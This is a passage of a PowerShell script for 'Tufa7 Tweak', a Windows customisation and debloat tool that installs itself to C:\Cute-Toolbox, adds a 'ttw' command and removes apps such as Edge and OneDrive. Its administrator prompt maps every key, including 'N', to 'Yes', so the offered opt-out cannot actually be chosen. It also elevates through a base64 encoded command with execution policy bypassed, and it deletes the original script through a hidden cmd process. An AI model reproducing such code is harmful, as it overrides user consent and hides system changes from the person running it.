        catch{}
        return
    }

    try{
        Add-Type @'
using System;
using System.Runtime.InteropServices;

public static class Tufa7EnvironmentNative
{
    [DllImport("user32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern IntPtr SendMessageTimeout(
        IntPtr hWnd,
        uint Msg,
        IntPtr wParam,
        string lParam,
        uint fuFlags,
        uint uTimeout,
        out IntPtr lpdwResult
    );
}
'@

        $result=[IntPtr]::Zero

        [void][Tufa7EnvironmentNative]::SendMessageTimeout(
            [IntPtr]0xffff,
            0x001A,
            [IntPtr]::Zero,
            'Environment',
            2,
            5000,
            [ref]$result
        )
    }
    catch{}
}

function Add-Tufa7PathEntry {
    param([Parameter(Mandatory)][string]$Directory)

    if([string]::IsNullOrWhiteSpace($Directory)){
        return
    }

    $directory=[IO.Path]::GetFullPath($Directory).TrimEnd('\')

    $userPath=[Environment]::GetEnvironmentVariable('Path','User')
    $parts=@()

    if(-not [string]::IsNullOrWhiteSpace($userPath)){
        $parts=@(
            $userPath.Split(';') |
                Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
        )
    }

    $exists=$false

    foreach($part in $parts){
        try{
            $candidate=[IO.Path]::GetFullPath($part.Trim()).TrimEnd('\')

            if([string]::Equals(
                $candidate,
                $directory,
                [StringComparison]::OrdinalIgnoreCase
            )){
                $exists=$true
                break
            }
        }
        catch{}
    }

    if(-not $exists){
        if([string]::IsNullOrWhiteSpace($userPath)){
            $userPath=$directory
        }
        else{
            $userPath=$userPath.TrimEnd(';')+';'+$directory
        }

        [Environment]::SetEnvironmentVariable(
            'Path',
            $userPath,
            'User'
        )
    }

    $processParts=@(
        $env:Path.Split(';') |
            Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
    )

    $processHas=$false

    foreach($part in $processParts){
        try{
            $candidate=[IO.Path]::GetFullPath($part.Trim()).TrimEnd('\')

            if([string]::Equals(
                $candidate,
                $directory,
                [StringComparison]::OrdinalIgnoreCase
            )){
                $processHas=$true
                break
            }
        }
        catch{}
    }

    if(-not $processHas){
        $env:Path=$directory+';'+$env:Path
    }
}

function Install-Tufa7CommandAlias {
    param(
        [Parameter(Mandatory)][string]$InstallDirectory,
        [Parameter(Mandatory)][string]$RuntimePath
    )

    $toolboxShim=Join-Path $InstallDirectory 'ttw.cmd'

    $windowsApps=Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsApps'
    New-Item -ItemType Directory -Path $windowsApps -Force -ErrorAction SilentlyContinue|Out-Null

    $windowsAppsShim=Join-Path $windowsApps 'ttw.cmd'

    $toolboxCommand=@'
@echo off
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "C:\Cute-Toolbox\Tufa7-Tweak.ps1" %*
'@

    [IO.File]::WriteAllText(
        $toolboxShim,
        $toolboxCommand.Trim()+[Environment]::NewLine,
        (New-Object Text.ASCIIEncoding)
    )

    $relay=@'
@echo off
call "C:\Cute-Toolbox\ttw.cmd" %*
'@

    try{
        [IO.File]::WriteAllText(
            $windowsAppsShim,
            $relay.Trim()+[Environment]::NewLine,
            (New-Object Text.ASCIIEncoding)
        )
    }
    catch{
        Write-CuteExceptionLog -Context 'ttw WindowsApps relay' -ErrorRecord $_
    }

    Add-Tufa7PathEntry -Directory $InstallDirectory
    Add-Tufa7PathEntry -Directory $windowsApps
    Send-Tufa7EnvironmentChanged

    if(-not (Test-Path -LiteralPath $toolboxShim)){
        throw 'C:\Cute-Toolbox\ttw.cmd was not created.'
    }

    $resolved=$null

    try{
        $resolved=& where.exe ttw 2>$null |
            Select-Object -First 1
    }
    catch{}

    if([string]::IsNullOrWhiteSpace([string]$resolved)){
        $candidate=@(
            $windowsAppsShim,
            $toolboxShim
        ) |
            Where-Object { Test-Path -LiteralPath $_ } |
            Select-Object -First 1

        if(-not $candidate){
            throw 'The ttw command could not be registered.'
        }

        Write-CuteLog 'TTW' 'where.exe did not resolve ttw in this host, but the command shim exists and PATH was updated.'
    }
    else{
        Write-CuteLog 'TTW' ('Resolved ttw command: '+$resolved)
    }

    return $toolboxShim
}

function Install-Tufa7DesktopShortcut {
    param(
        [Parameter(Mandatory)][string]$InstallDirectory,
        [Parameter(Mandatory)][string]$RuntimePath
    )

    $desktop=[Environment]::GetFolderPath('Desktop')

    if([string]::IsNullOrWhiteSpace($desktop)){
        $desktop=Join-Path $HOME 'Desktop'
    }

    if(-not (Test-Path -LiteralPath $desktop)){
        New-Item -ItemType Directory -Path $desktop -Force|Out-Null
    }

    $shortcutPath=Join-Path $desktop 'Tufa7 Tweak.lnk'
    $iconPath=Install-Tufa7ShortcutIcon -InstallDirectory $InstallDirectory

    $powershell=Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'

    if(-not (Test-Path -LiteralPath $powershell)){
        $powershell='powershell.exe'
    }

    $shell=New-Object -ComObject WScript.Shell
    $shortcut=$shell.CreateShortcut($shortcutPath)

    $shortcut.TargetPath=$powershell
    $shortcut.Arguments='-NoLogo -NoProfile -ExecutionPolicy Bypass -File "'+$RuntimePath+'"'
    $shortcut.WorkingDirectory=$InstallDirectory
    $shortcut.Description='Tufa7 Tweak'

    if($iconPath -and (Test-Path -LiteralPath $iconPath)){
        $shortcut.IconLocation=$iconPath
    }
    else{
        $shortcut.IconLocation=(Join-Path $env:SystemRoot 'System32\shell32.dll')+',72'
    }

    $shortcut.Save()

    if(-not (Test-Path -LiteralPath $shortcutPath)){
        throw 'The Tufa7 Tweak Desktop shortcut was not created.'
    }

    Write-CuteLog 'SHORTCUT' ('Desktop shortcut created: '+$shortcutPath)

    return $shortcutPath
}

function Install-Tufa7TweakSelf {
    if($script:IsToolboxRuntime){
        $script:TtwCommandInstalled=$true
        Show-OK 'Tufa7 Tweak Toolbox runtime is already installed.'
        return
    }

    Assert-Administrator 'Tufa7 Tweak Toolbox install'

    $source=Get-CuteScriptPath
    $script:OriginalSourceInstallerPath=$source

    if([string]::IsNullOrWhiteSpace($source) -or -not (Test-Path -LiteralPath $source)){
        throw 'The running Tufa7 Tweak source path could not be resolved.'
    }

    $installDir=Get-Tufa7InstallDirectory

    if(Test-Path -LiteralPath $installDir){
        try{
            New-Item -ItemType Directory -Path $installDir -Force|Out-Null
        }
        catch{}
    }
    else{
        New-Item -ItemType Directory -Path $installDir -Force -ErrorAction Stop|Out-Null
    }

    $runtimePath=Join-Path $installDir 'Tufa7-Tweak.ps1'

    $runtimeText=Get-Tufa7ToolboxRuntimeText -SourcePath $source

    [IO.File]::WriteAllText(
        $runtimePath,
        $runtimeText,
        (New-Object Text.UTF8Encoding($true))
    )

    if(-not (Test-Path -LiteralPath $runtimePath)){
        throw 'The sanitized Tufa7 Tweak PowerShell runtime was not created.'
    }

    $ttwPath=Install-Tufa7CommandAlias `
        -InstallDirectory $installDir `
        -RuntimePath $runtimePath

    try{
        [void](Install-Tufa7DesktopShortcut `
            -InstallDirectory $installDir `
            -RuntimePath $runtimePath)
    }
    catch{
        Write-CuteExceptionLog -Context 'Desktop shortcut' -ErrorRecord $_
        Show-Warn 'Toolbox and ttw were installed, but the Desktop shortcut could not be created.'
    }

    $script:ToolboxRuntimeInstalled=$true
    $script:TtwCommandInstalled=$true

    Show-OK 'Sanitized Tufa7 Tweak runtime installed to C:\Cute-Toolbox.'
    Show-OK ('ttw command installed: '+$ttwPath)
    Show-OK 'Desktop shortcut created when Windows permits it.'
}

function Schedule-Tufa7SourceInstallerDeletion {
    param([Parameter(Mandatory)][string]$SourcePath)

    if($script:IsToolboxRuntime){
        return
    }

    if([string]::IsNullOrWhiteSpace($SourcePath)){
        return
    }

    if(-not (Test-Path -LiteralPath $SourcePath)){
        return
    }

    try{
        $toolboxRoot=[IO.Path]::GetFullPath((Get-Tufa7InstallDirectory)).TrimEnd('\')+'\'
        $sourceFull=[IO.Path]::GetFullPath($SourcePath)

        if($sourceFull.StartsWith(
            $toolboxRoot,
            [StringComparison]::OrdinalIgnoreCase
        )){
            Write-CuteLog 'CLEANUP' 'Skipped source deletion because the running file is the installed Toolbox runtime.'
            return
        }
    }
    catch{
        return
    }

    $escaped=$SourcePath.Replace('"','""')

    $command='/d /c ping 127.0.0.1 -n 8 >nul & del /f /q "'+$escaped+'"'

    Write-CuteLog 'CLEANUP' ('Original source will be deleted after Tufa7 Tweak exits: '+$SourcePath)

    Start-Process `
        -FilePath $env:ComSpec `
        -ArgumentList $command `
        -WindowStyle Hidden `
        -ErrorAction SilentlyContinue |
        Out-Null
}

function Get-CuteScriptPath {
    if (-not [string]::IsNullOrWhiteSpace([string]$PSCommandPath)) {
        return $PSCommandPath
    }

    if ($MyInvocation.MyCommand.Path) {
        return $MyInvocation.MyCommand.Path
    }

    return $null
}

function Get-SelectedTaskIds {
    return (($TaskCatalog | Where-Object Selected | ForEach-Object Id) -join ',')
}

function Set-SelectedTaskIds {
    param([string]$Ids)

    $wanted = @()
    if (-not [string]::IsNullOrWhiteSpace($Ids)) {
        $wanted = $Ids.Split(',') | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
    }

    foreach ($task in $TaskCatalog) {
        $task.Selected = ($wanted -contains $task.Id)
    }
}

function Get-SelectedAdminTasks {
    return @(
        $TaskCatalog |
            Where-Object {
                $_.Selected -and
                $_.Admin -like 'Yes*' -and
                $_.Id -ne 'LiteBar'
            }
    )
}

function Disable-SelectedAdminTasks {
    $disabled = New-Object System.Collections.Generic.List[string]

    foreach ($task in $TaskCatalog) {
        if (
            $task.Selected -and
            $task.Admin -like 'Yes*' -and
            $task.Id -ne 'LiteBar'
        ) {
            $task.Selected = $false
            $disabled.Add($task.Name)
        }
    }

    return $disabled
}

function Start-CuteElevated {
    param(
        [Parameter(Mandatory)][string]$Mode
    )

    $scriptPath = Get-CuteScriptPath
    if ([string]::IsNullOrWhiteSpace($scriptPath) -or -not (Test-Path $scriptPath)) {
        throw 'Tufa7 Tweak could not determine its own script path for elevation.'
    }

    $selectedIds = Get-SelectedTaskIds

    $escapedPath = $scriptPath.Replace("'","''")
    $escapedMode = $Mode.Replace("'","''")
    $escapedIds  = $selectedIds.Replace("'","''")
    $escapedShell = $script:ShellTarget.Replace("'","''")
    $escapedTheme = $script:CuteTheme.Replace("'","''")

    $command = @"
& '$escapedPath' -ResumeMode '$escapedMode' -ResumeTasks '$escapedIds' -ResumeShell '$escapedShell' -ResumeTheme '$escapedTheme'
"@

    $encoded = [Convert]::ToBase64String(
        [Text.Encoding]::Unicode.GetBytes($command)
    )

    Start-Process `
        -FilePath 'powershell.exe' `
        -Verb RunAs `
        -ArgumentList @(
            '-NoProfile',
            '-ExecutionPolicy','Bypass',
            '-EncodedCommand',$encoded
        ) `
        -ErrorAction Stop | Out-Null
}

function Resolve-AdministratorMode {
    param(
        [Parameter(Mandatory)][string]$Mode
    )

    if(Test-IsAdministrator){
        return 'Continue'
    }

    $adminTasks=@(Get-SelectedAdminTasks)

    if($adminTasks.Count -eq 0){
        return 'Continue'
    }

    $choice='Y'

    Show-Logo
    Show-Section 'ADMINISTRATOR REQUIRED'
    CWrite '   Some selected options require Administrator:' Yellow
    CWrite ''

    foreach($task in $adminTasks){
        CWrite ('   ● '+$task.Name) White
    }

    CWrite ''
    CWrite '   [ Y ] / [ N ] choose   [ ENTER ] confirm' DarkGray
    CWrite ''

    $choiceTop=[Console]::CursorTop

    while($true){
        Clear-CuteRows -Top $choiceTop -Count 3

        if($choice -eq 'Y'){
            CWrite '   > [Y] Restart Tufa7 Tweak as Administrator and keep selections' Cyan
            CWrite '     [N] Continue without Administrator options' Gray
        }
        else{
            CWrite '     [Y] Restart Tufa7 Tweak as Administrator and keep selections' Gray
            CWrite '   > [N] Continue without Administrator options' Yellow
        }

        $key=[Console]::ReadKey($true)

        switch($key.Key){
            'Y'{$choice='Y'}
            'N'{$choice='Y'}
            'UpArrow'{$choice='Y'}
            'DownArrow'{$choice='Y'}
            'LeftArrow'{$choice='Y'}
            'RightArrow'{$choice='Y'}
            'Escape'{$choice='Y'}

            'Enter'{
                if($choice -eq 'Y'){
                    try{
                        Show-Info 'Requesting Administrator permission...'
                        Start-CuteElevated -Mode $Mode
                        Show-OK 'Administrator Tufa7 Tweak window started.'
                        Start-Sleep -Milliseconds 250
                        Restore-CuteClipboard
                        Clear-CuteTemp
                        [Environment]::Exit(0)
                        return 'Relaunched'
                    }
                    catch{
                        Show-Warn 'Administrator permission was not granted.'
                        $disabled=@(Disable-SelectedAdminTasks)

                        if($disabled.Count -gt 0){
                            CWrite '   Continuing without these Administrator options:' DarkGray

                            foreach($name in $disabled){
                                CWrite ('   - '+$name) DarkGray
                            }
                        }

                        Start-Sleep -Seconds 1
                        return 'Continue'
                    }
                }
                else{
                    $disabled=@(Disable-SelectedAdminTasks)

                    CWrite ''
                    Show-Warn 'Administrator options were removed from this run.'

                    foreach($name in $disabled){
                        CWrite ('   - '+$name) DarkGray
                    }

                    Start-Sleep -Seconds 1
                    return 'Continue'
                }
            }
        }
    }
}

function Show-Plan {
    param([string]$Mode)

    Show-Logo
    Show-Section ($Mode.ToUpper() + ' PLAN')

    if ($Mode -eq 'Auto') {
        CWrite '   AUTO mode selected ALL available tweaks.' Yellow
        CWrite '   This includes CAUTION/DANGER items such as removing Edge, OneDrive,' Yellow
        CWrite '   Widgets, Xbox apps and common preinstalled apps.' Yellow
        CWrite ''
    } else {
        CWrite '   CUTE will apply the selected terminal / Windows tweaks below.' Gray
        CWrite ''
    }

    $selected = @($TaskCatalog | Where-Object Selected)

    foreach ($task in $selected) {
        $riskColor = 'DarkGray'
        if ($task.Risk -eq 'Caution') { $riskColor = 'Yellow' }
        if ($task.Risk -eq 'DANGER')  { $riskColor = 'Red' }

        CWrite ('   ● [' + $task.Category + '] ' + $task.Name) White -NoNewline
        CWrite ('  Admin:' + $task.Admin) $(if ($task.Admin -like 'Yes*') { 'Yellow' } else { 'DarkGray' }) -NoNewline
        CWrite ('  ' + $task.Risk) $riskColor
    }

    if (($selected | Where-Object { $_.Admin -like 'Yes*' }).Count -gt 0 -and -not (Test-IsAdministrator)) {
        CWrite ''
        Show-Warn 'Administrator options are selected but Tufa7 Tweak is not elevated.'
        CWrite '   After confirmation, Tufa7 Tweak will ask to restart as Administrator.' DarkGray
        CWrite '   Choosing No removes only Admin-required options; LiteBar remains available.' DarkGray
    }

    CWrite ''
    CWrite '   Optional task failures will NOT stop later tasks.' DarkGray
    CWrite '   Microsoft Edge removal is marked DANGER and may be reverted by Windows updates.' DarkGray
    CWrite ''
    CWrite '   Press Enter to start, or Q to go back.' Cyan

    while ($true) {
        $key = [Console]::ReadKey($true)
        if ($key.Key -eq 'Enter') { return $true }
        if ($key.Key -eq 'Q' -or $key.Key -eq 'Escape') { return $false }
    }
}

function Invoke-SelectedTasks {
    Show-Logo
    Show-Section 'INSTALLING'
    CWrite '   Keep this terminal open until CUTE finishes.' DarkGray
    CWrite ''

    $needsExplorerRestart = $false
    $successfulTasks = New-Object System.Collections.Generic.List[string]
    $failedTasks = New-Object System.Collections.Generic.List[string]

    try {
        Show-Section 'PREPARING'
        Ensure-WinGetDefault
        $successfulTasks.Add('WinGet')

        Ensure-WindowsTerminalSetup
        $successfulTasks.Add('Windows Terminal + Nerd Font')

        if (Test-Python314) {
            $pythonExisting = Get-Python314Executable
            Show-OK 'Python 3.14 is already installed.'
        }
        else {
            Install-PythonManager
            Install-PythonRuntime
        }

        $successfulTasks.Add('Python 3.14')

        if(-not $script:IsToolboxRuntime){
            Invoke-Tufa7SourceOnlySetup
            $successfulTasks.Add('Python 3.14 Repair')
        }
        Start-Sleep -Milliseconds $Config.StepDelayMs
    }
    catch {
        Show-Section 'REQUIRED SETUP ERROR'
        Show-ErrorText $_.Exception.Message
        CWrite ''
        CWrite '   Required setup could not finish, so CUTE stopped.' DarkGray
        Clear-CuteTemp
        Restore-CuteClipboard
        Pause-Cute
        return $false
    }

    $optionalIndex = 1

    foreach ($task in $TaskCatalog | Where-Object Selected) {
        Show-Section ('OPTIONAL ' + $optionalIndex + '. ' + $task.Name + '  [Admin: ' + $task.Admin + ' | ' + $task.Risk + ']')

        try {
            switch ($task.Id) {
                'RestorePoint'         { New-CuteRestorePoint }
                'Fastfetch'            { Install-Fastfetch }
                'FastfetchStartup'     {
                    if (-not (Get-Command fastfetch.exe -ErrorAction SilentlyContinue)) {
                        Install-Fastfetch
                    }
                    Add-FastfetchStartup
                }
                'CutePrompt'           { Add-CutePowerShellPrompt }
                'LiteBar'              { Install-LiteBar }
                'PaidBbm'              { Install-Tufa7PaidBbm }

                'DarkMode'             { Set-DarkMode }
                'TaskbarLeft'          { Set-TaskbarLeft; $needsExplorerRestart = $true }
                'HideSearch'           { Hide-TaskbarSearch; $needsExplorerRestart = $true }
                'HideTaskView'         { Hide-TaskView; $needsExplorerRestart = $true }
                'Extensions'           { Set-ShowExtensions; $needsExplorerRestart = $true }
                'HiddenFiles'          { Set-ShowHiddenFiles; $needsExplorerRestart = $true }
                'ExplorerThisPC'       { Set-ExplorerThisPC }
                'CompactMode'          { Set-ExplorerCompactMode; $needsExplorerRestart = $true }
                'ClassicMenu'          { Set-ClassicContextMenu; $needsExplorerRestart = $true }
                'StartRecommendations' { Disable-StartRecommendations; $needsExplorerRestart = $true }

                'Telemetry'            { Disable-Telemetry }
                'ActivityHistory'      { Disable-ActivityHistory }
                'ConsumerFeatures'     { Disable-ConsumerFeatures }
                'DeliveryOptimization' { Disable-DeliveryOptimization }
                'Location'             { Disable-LocationTracking }
                'BackgroundApps'       { Disable-BackgroundApps }

                'DisableCopilot'       { Disable-Copilot; $needsExplorerRestart = $true }
                'RemoveCopilot'        { Remove-CopilotApp; $needsExplorerRestart = $true }
                'RemoveWidgets'        { Remove-Widgets; $needsExplorerRestart = $true }
                'EdgeDebloat'          { Set-EdgeDebloat }
                'RemoveEdge'           { Remove-MicrosoftEdge }
                'RemoveOneDrive'       { Remove-OneDrive }
                'RemoveXbox'           { Remove-XboxApps }
                'RemoveBloat'          { Remove-PreinstalledApps }

                'TempCleanup'          { Clear-TemporaryFiles }
                'VisualPerformance'    { Set-BestPerformanceVisuals; $needsExplorerRestart = $true }
                'ServicesLean'         { Set-ServicesLean }
                'DisableHibernation'   { Disable-Hibernation }
                'BrowserEdge'          { Invoke-BrowserDebloat -Id 'BrowserEdge' }
                'BrowserChrome'        { Invoke-BrowserDebloat -Id 'BrowserChrome' }
                'BrowserFirefox'       { Invoke-BrowserDebloat -Id 'BrowserFirefox' }
                'BrowserBrave'         { Invoke-BrowserDebloat -Id 'BrowserBrave' }
            }

            $successfulTasks.Add($task.Name)
        }
        catch {
            $failedTasks.Add($task.Name)
            Show-ErrorText ($task.Name + ': ' + $_.Exception.Message)
            CWrite '   Continuing with the next selected task...' DarkGray
        }

        Start-Sleep -Milliseconds $Config.StepDelayMs
        $optionalIndex++
    }

    if ($needsExplorerRestart) {
        Show-Section 'APPLY WINDOWS CHANGES'
        try {
            Restart-Explorer
            $successfulTasks.Add('Restart Explorer')
        }
        catch {
            $failedTasks.Add('Restart Explorer')
            Show-ErrorText 'Explorer could not be restarted automatically.'
        }
    }

    if(-not $script:IsToolboxRuntime){
        try{
            Install-Tufa7TweakSelf
            $successfulTasks.Add('C:\Cute-Toolbox + ttw command')
        }
        catch{
            $failedTasks.Add('C:\Cute-Toolbox + ttw command')
            Show-Warn ('Tufa7 Tweak could not install C:\Cute-Toolbox or the ttw command: '+$_.Exception.Message)
        }
    }

    Show-Section 'SUMMARY'

    CWrite ('   SUCCESSFUL: ' + $successfulTasks.Count) Green
    if($successfulTasks.Count -gt 0){
        foreach($name in $successfulTasks){
            CWrite ('     [OK] ' + $name) Green
        }
    }
    else{
        CWrite '     None' DarkGray
    }

    CWrite ''

    CWrite ('   FAILED: ' + $failedTasks.Count) $(if($failedTasks.Count -gt 0){'Red'}else{'Green'})
    if($failedTasks.Count -gt 0){
        foreach($name in $failedTasks){
            CWrite ('     [XX] ' + $name) Red
        }
    }
    else{
        CWrite '     None' Green
    }

    CWrite ''

    if ($failedTasks.Count -eq 0) {
        Show-OK 'Tufa7 Tweak finished successfully.'
    }
    else {
        Show-Warn ('Tufa7 Tweak finished with ' + $failedTasks.Count + ' failed task(s).')
        CWrite '   Successful tasks were kept; failed tasks did not block later tasks.' DarkGray
    }

    if (($TaskCatalog | Where-Object Id -eq 'FastfetchStartup').Selected) {
        CWrite '   Open a NEW PowerShell window to see Fastfetch at startup.' Cyan
    }

    if (($TaskCatalog | Where-Object Id -eq 'CutePrompt').Selected) {
        CWrite '   Open a NEW PowerShell window to see the Tufa7 prompt.' Cyan
    }

    CWrite '   Windows Terminal was configured with acrylic transparency + JetBrainsMono Nerd Font.' Cyan
    if($script:TtwCommandInstalled){
        CWrite '   TIP: type  ttw  in CMD, Windows Terminal, or PowerShell to launch Tufa7 Tweak.' Magenta
    }
    CWrite '   Reopen Tufa7 Tweak anytime for APPS or Tufa7 Wallpaper.' DarkGray

    Clear-CuteTemp
    Restore-CuteClipboard

    $popupStarted=Show-CuteCompletionWindow `
        -SuccessCount $successfulTasks.Count `
        -FailedCount $failedTasks.Count `
        -FailedTasks @($failedTasks)

    if(-not $popupStarted){
        CWrite ''
        Show-Warn 'Completion window could not be opened.'
        Pause-CuteExit
    }

    if(
        $script:ToolboxRuntimeInstalled -and
        -not $script:IsToolboxRuntime -and
        -not [string]::IsNullOrWhiteSpace($script:OriginalSourceInstallerPath)
    ){
        Schedule-Tufa7SourceInstallerDeletion `
            -SourcePath $script:OriginalSourceInstallerPath
    }

    return $true
}

function Start-Cute {
    if([string]::IsNullOrWhiteSpace($ResumeMode) -and [string]::IsNullOrWhiteSpace($ResumeTasks)){
        Show-Tufa7WelcomeNotification
    }

    if (
        -not [string]::IsNullOrWhiteSpace($ResumeMode) -and
        -not [string]::IsNullOrWhiteSpace($ResumeTasks)
    ) {
        Set-SelectedTaskIds -Ids $ResumeTasks
        if(-not [string]::IsNullOrWhiteSpace($ResumeShell)){$script:ShellTarget=$ResumeShell}
        if(-not [string]::IsNullOrWhiteSpace($ResumeTheme)){$script:CuteTheme=$ResumeTheme}
        Apply-CuteThemeSelection

        Show-Logo
        Show-Section 'ADMINISTRATOR MODE'
        Show-OK 'Tufa7 Tweak restarted with Administrator permission.'
        CWrite '   Your previous selections were restored.' DarkGray

        Initialize-Tufa7ElevatedSession

        [void](Invoke-SelectedTasks)
        return
    }

    while ($true) {
        $detectedBrowsers = @(Update-BrowserTasks)
        $mode = Select-Mode

        if ($mode -eq 'Exit') {
            return
        }

        if ($mode -eq 'Applications') {
            Show-AppInstaller
            continue
        }

        if ($mode -eq 'Wallpapers') {
            Show-Tufa7WallpaperBrowser
            continue
        }

        $script:ShellTarget=Select-PowerShellTarget
        if($script:ShellTarget -ne 'Skip'){
            $script:CuteTheme=Select-CuteTheme
            Apply-CuteThemeSelection
        }

        if ($mode -eq 'Auto') {
            Reset-Selections -AllOptional

            ($TaskCatalog | Where-Object Id -eq 'PaidBbm').Selected = $true
            foreach ($task in $TaskCatalog | Where-Object Category -eq 'Browser') { $task.Selected = $false }
            if ($detectedBrowsers.Count -gt 0) {
                Show-Logo
                Show-Section 'BROWSERS DETECTED'
                CWrite ('   ' + ($detectedBrowsers -join ', ')) White
                CWrite ''
                CWrite '   Apply safe browser debloat presets? [Y/N]' Cyan
                $bk = [Console]::ReadKey($true)
                if ($bk.Key -eq 'Y') {
                    foreach ($task in $TaskCatalog | Where-Object Category -eq 'Browser') { $task.Selected = $true }
                }
            }
        } else {
            Select-ManualTasks
        }

        if (-not (Show-Plan -Mode $mode)) {
            continue
        }

        $adminResult = Resolve-AdministratorMode -Mode $mode
        if ($adminResult -eq 'Relaunched') {
            return
        }

        $done = Invoke-SelectedTasks
        if ($done) {
            return
        }
    }
}

try {
    Start-Cute
}
catch {
    Show-ErrorText ('Unhandled error: ' + $_.Exception.Message)
    Pause-Cute
}
finally {
Clear-CuteTemp
    Restore-CuteClipboard
}

if($script:ExitAfterElevation){
    exit 0
}

if($PSCommandPath){
    exit 0
}
